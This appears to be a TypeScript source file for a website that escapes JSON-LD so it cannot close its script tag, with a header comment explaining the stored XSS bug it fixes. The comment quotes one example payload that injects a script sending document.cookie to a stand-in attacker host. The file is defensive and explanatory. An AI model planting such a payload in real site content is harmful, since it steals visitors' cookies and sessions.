/**
 * ============================================================================
 *  JSON-LD SERIALISATION — the only safe way to put JSON inside <script>.
 * ----------------------------------------------------------------------------
 *  `JSON.stringify` does NOT escape `<`, `>` or `/`. Inside an
 *  `<script type="application/ld+json">` block the HTML parser is still
 *  looking for the literal sequence `</script`, so a value that contains it
 *  survives byte-for-byte into the page, closes the ld+json block early and
 *  turns everything after it into live markup:
 *
 *    { "text": "Да.</script><script>fetch('//evil.tld?c='+document.cookie)</script>" }
 *
 *  That is stored XSS on the client's production site, reachable with nothing
 *  but content-editor rights (FAQ question/answer are CMS-editable) — see
 *  SECURITY-AUDIT-2026-07-30 H-4.
 *
 *  The fix is to escape the characters that can start an HTML token, plus the
 *  two line separators that are legal in JSON strings but illegal in ES5
 *  source (U+2028/U+2029 break any consumer that evaluates the block as JS).
 *  All five are valid JSON `\uXXXX` escapes: `JSON.parse` — and therefore
 *  every schema.org consumer, Google's Rich Results Test included — decodes
 *  them back to the original characters, so the structured data is unchanged.
 *
 *  DEFENCE IN DEPTH — this is layer 3 of 3, and the only one that is always
 *  present:
 *    1. The CMS portal (Freim Deploy `client-portal/`) rejects `</` in content
 *       strings on save.
 *    2. `maxLength`/`maxItems` in `src/config/schemas.ts` → the portal's Ajv
 *       validation caps how much an editor can submit at all.
 *    3. THIS FILE — output encoding at the sink. Layers 1 and 2 live in
 *       another repo and only cover the portal write path; anything else that
 *       lands in `src/content/**` (a direct git commit, a future integration)
 *       bypasses them. This layer cannot be bypassed.
 *
 *  RULE: every `set:html` that emits JSON MUST go through `serializeJsonLd`.
 *  Never call `JSON.stringify` directly in a `.astro` template.
 * ============================================================================
 */

/** Characters that must not reach the HTML parser verbatim, and the JSON
 *  escape each becomes. `&` is escaped too so the output stays safe if the
 *  serialised JSON is ever moved into an attribute or another
 *  entity-decoding context. */
const JSON_LD_ESCAPES: Record<string, string> = {
  '<': '\\u003c',
  '>': '\\u003e',
  '&': '\\u0026',
  '\u2028': '\\u2028',
  '\u2029': '\\u2029',
};

const UNSAFE_JSON_LD_CHARS = /[<>&\u2028\u2029]/g;

/**
 * Serialise a value for embedding in a `<script type="application/ld+json">`.
 * The result is valid JSON and contains no `<`, `>`, `&`, U+2028 or U+2029,
 * so it cannot terminate the surrounding script element.
 */
export function serializeJsonLd(value: unknown): string {
  return JSON.stringify(value).replace(
    UNSAFE_JSON_LD_CHARS,
    (char) => JSON_LD_ESCAPES[char] as string,
  );
}
